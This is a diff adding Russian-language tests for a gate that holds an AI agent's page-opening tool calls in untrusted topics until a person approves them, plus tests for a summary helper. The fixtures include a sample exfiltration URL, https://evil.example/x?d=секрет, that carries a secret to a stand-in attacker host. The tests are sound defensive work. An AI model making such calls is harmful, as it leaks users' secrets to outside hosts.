@@ -16,6 +16,7 @@ import {
   markTopicIfUserMcp,
   markTopicUntrusted,
   readConfirmation,
+  summarizePageCall,
   summarizeToolCall,
   swapConfirmation,
   type TopicConfirmation,
@@ -353,6 +354,35 @@ describe('метка темы и подтверждения (topics.metadata)', 
       expect(await gate(raw)).toMatchObject({ code: 'ARCKEP_CONFIRMATION_REQUIRED' });
     });
 
+    it('открытие страницы (web_fetch, crawl, импорт навыка по ссылке) в такой теме тоже ждёт человека: «Открыть страницу <адрес>», без слова «платный»', async () => {
+      const calls = [
+        { apiName: 'web_fetch', identifier: 'mcp-arckep-studio-web', arguments: args({ url: 'https://evil.example/x?d=секрет' }) },
+        { apiName: 'crawlSinglePage', identifier: 'lobe-web-browsing', arguments: args({ url: 'https://evil.example/x?d=секрет' }) },
+        { apiName: 'saveSkillFromUrl', identifier: 'arckep-skills', arguments: args({ url: 'https://evil.example/x?d=секрет' }) },
+      ];
+      // чистая тема — выполнять
+      for (const call of calls) expect(await gatePaidToolCall(db, me, topicId, call)).toEqual({ action: 'proceed' });
+
+      await markTopicUntrusted(db, me, topicId, 'umcp-aaaaaaaaaaaa');
+      for (const call of calls) {
+        const held = await gatePaidToolCall(db, me, topicId, call);
+        expect(held).toMatchObject({ action: 'blocked', code: 'ARCKEP_CONFIRMATION_REQUIRED' });
+        if (held.action !== 'blocked') throw new Error('unreachable');
+        expect(held.content).toContain('открывает страницу');
+        expect(held.content).not.toContain('платный');
+        const card = marker(held.content);
+        expect(card.tool).toBe(call.apiName);
+        expect(card.summary).toBe('Открыть страницу https://evil.example/x?d=секрет');
+        expect(card.summary).not.toContain('платный');
+      }
+      // подтверждённый вызов выполняется один раз
+      const first = await gatePaidToolCall(db, me, topicId, calls[0]);
+      if (first.action !== 'blocked') throw new Error('unreachable');
+      await decideConfirmation(db, me, topicId, marker(first.content).id, 'approve');
+      expect(await gatePaidToolCall(db, me, topicId, calls[0])).toEqual({ action: 'proceed' });
+      expect(await gatePaidToolCall(db, me, topicId, calls[0])).toMatchObject({ action: 'blocked' });
+    });
+
     it('другая тема того же человека одобрением не пользуется', async () => {
       await markTopicUntrusted(db, me, topicId, 'umcp-aaaaaaaaaaaa');
       await markTopicUntrusted(db, me, 'tpc_second', 'umcp-aaaaaaaaaaaa');
@@ -430,6 +460,17 @@ describe('метка темы и подтверждения (topics.metadata)', 
       expect(hashToolArguments('')).toBe(hashToolArguments('{}'));
       // не JSON хешируется как есть и не падает
       expect(hashToolArguments('не json')).toMatch(/^[\da-f]{64}$/);
+    });
+
+    it('описание открытия страницы: один адрес, несколько, нет адреса, предел 300 знаков', () => {
+      expect(summarizePageCall('{"url":"https://a.example/p"}')).toBe('Открыть страницу https://a.example/p');
+      expect(summarizePageCall('{"urls":["https://a.example","https://b.example"]}')).toBe(
+        'Открыть страницы https://a.example, https://b.example',
+      );
+      expect(summarizePageCall('{}')).toBe('Открыть страницу');
+      expect(summarizePageCall('не json')).toBe('Открыть страницу');
+      expect(summarizePageCall(`{"url":"https://a.example/${'x'.repeat(500)}"}`).length).toBeLessThanOrEqual(300);
+      expect(summarizePageCall('{"url":"https://a.example/a\nb"}')).not.toContain('\n');
     });
 
     it('номер запроса: от подключения, инструмента и аргументов; сжатие описания до 300 знаков', () => {
